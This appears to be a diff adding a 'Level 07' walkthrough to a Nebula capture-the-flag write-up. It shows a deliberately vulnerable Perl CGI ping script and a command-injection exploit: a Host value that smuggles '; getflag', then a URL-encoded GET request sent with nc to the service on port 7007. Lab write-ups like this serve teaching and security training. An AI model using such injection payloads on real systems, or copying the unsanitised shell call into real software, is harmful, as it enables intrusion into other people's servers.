@@ -292,3 +292,122 @@ You have successfully executed getflag on a target account
 ```
 
 Success.
+
+## Level 07
+
+The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
+
+To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
+
+```
+#!/usr/bin/perl
+
+use CGI qw{param};
+
+print "Content-type: text/html\n\n";
+
+sub ping {
+  $host = $_[0];
+
+  print("<html><head><title>Ping results</title></head><body><pre>");
+
+  @output = `ping -c 3 $host 2>&1`;
+  foreach $line (@output) { print "$line"; }
+
+  print("</pre></body></html>");
+  
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param("Host"));
+```
+
+Let's log in as level07 and let's try to execute the file.
+
+```
+level07@nebula:/home/flag07$ ./index.cgi Host=8.8.8.8
+Content-type: text/html
+
+<html><head><title>Ping results</title></head><body><pre>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_req=1 ttl=255 time=88.8 ms
+64 bytes from 8.8.8.8: icmp_req=2 ttl=255 time=112 ms
+64 bytes from 8.8.8.8: icmp_req=3 ttl=255 time=135 ms
+
+--- 8.8.8.8 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2001ms
+rtt min/avg/max/mdev = 88.805/112.191/135.258/18.967 ms
+```
+
+As expected we get the result of the ping command to Google's DNS (8.8.8.8).
+
+Analyzing the source code, we see that the `Host` parameter is appended to `ping` command. Can we perform an injection here?
+
+Let's try appending `getflag` to our `Host` string:
+
+```
+level07@nebula:/home/flag07$ ./index.cgi Host=8.8.8.8; getflag
+...
+64 bytes from 8.8.8.8: icmp_req=1 ttl=255 time=98.6 ms
+64 bytes from 8.8.8.8: icmp_req=2 ttl=255 time=119 ms
+64 bytes from 8.8.8.8: icmp_req=3 ttl=255 time=40.6 ms
+...
+</pre></body></html>getflag is executing on a non-flag account, this doesn't count
+```
+
+`getflag` is executed, but not as flag07...
+
+Let's see what's inside `/home/flag07`:
+
+```
+level07@nebula:/home/flag07$ ls -la
+total 10
+...
+-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
+...
+-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
+```
+
+The `thttpd.conf` file looks suspicious. Do we have some kind of services here? Let's open another terminal and `nmap` the machine:
+
+```
+nmap 192.168.56.101                                                            
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+7007/tcp open  afs3-bos
+...
+```
+
+We do! Something is open on port 7007.
+
+Checking the content of `thttpd.conf`, we can notice an interesting line:
+
+```
+# Specifies what user to switch to after initialization when started as root.
+user=flag07
+```
+
+So the program is executing as flag07 if it's a service. What if we try to contact this service from a remote host?
+
+We can craft a `GET` request for `index.cgi?Host=8.8.8.8;/bin/getflag`.
+
+Let's check the ASCII encoding for ";" and "/":
+- ; -> 3B
+- / -> 2F
+
+So the string should be something similar:
+
+`GET index.cgi?Host=8.8.8.8%3B%2Fbin%2Fgetflag`
+
+Let's use `nc` to communicate with the service:
+
+```
+nc 192.168.56.101 7007
+GET /index.cgi?Host=8.8.8.8%3B%2Fbin%2fgetflag                   
+...
+You have successfully executed getflag on a target account
+...  
+```
+
+Success.
